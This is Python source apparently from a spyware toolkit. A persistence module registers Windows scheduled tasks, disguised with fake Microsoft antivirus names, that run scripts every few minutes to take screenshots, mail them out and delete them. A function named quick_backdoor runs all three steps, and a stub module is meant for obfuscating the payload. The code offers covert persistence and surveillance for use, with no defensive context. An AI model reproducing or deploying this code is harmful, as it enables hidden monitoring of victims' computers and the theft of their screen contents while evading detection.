# persist.py
import subprocess

def schedule_screenshot():
    subprocess.run([
        "powershell",
        "schtasks /create /sc minute /mo 1 /tn MicrosoftAntiVirusCriticalUpdatesCore /tr C:\\Python36\\Shoot.vbs"
    ], shell=False)


def schedule_mail():
    subprocess.run([
        "powershell",
        "schtasks /create /sc minute /mo 5 /tn MicrosoftAntiVirusCriticalUpdatesUA /tr C:\\Python36\\Mail.vbs"
    ], shell=False)


def schedule_cleanup():
    subprocess.run([
        "powershell",
        "schtasks /create /sc minute /mo 12 /tn MicrosoftAntiVirusCriticalUpdatesDF /tr C:\\Python36\\delScreenShot.vbs"
    ], shell=False)


def quick_backdoor():
    schedule_screenshot()
    schedule_mail()
    schedule_cleanup()
    print("[+] Backdoor persistence fully configured.")


# obfuscate.py (placeholder for future expansion)
def obfuscate_payload(payload_path):
    print(f"[*] Obfuscating {payload_path}... (Not implemented)")
    # You can later integrate obfuscation tools or methods here.
    pass
